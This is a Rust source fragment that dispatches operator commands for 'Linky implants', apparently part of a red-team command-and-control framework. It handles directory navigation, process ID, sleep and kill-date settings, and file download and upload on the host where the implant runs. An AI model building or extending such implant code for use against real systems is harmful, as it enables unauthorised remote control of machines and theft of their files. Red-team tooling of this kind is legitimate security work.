/// Cross-platform command dispatch for Linky implants.
///
/// Returns `Some(output)` if the command was handled here,
/// `None` if the caller's platform-specific code should handle it.
pub fn dispatch_common(raw: &str) -> Option<String> {
    let (cmd, args) = crate::split_first(raw);
    let output = match cmd {
        "cd" => std::env::set_current_dir(args)
            .map(|_| String::new())
            .unwrap_or_else(|e| format!("[-] {}", e)),

        "pwd" => std::env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|e| format!("[-] {}", e)),

        "ls" => crate::list_dir(if args.is_empty() { "." } else { args }),

        "pid" => std::process::id().to_string(),

        "sleep" => crate::handle_sleep_command(args),

        "killdate" => crate::handle_killdate_command(args),

        "download" => crate::download_file(args),

        "upload" => crate::upload_file(args),

        _ => return None,
    };
    Some(output)
}
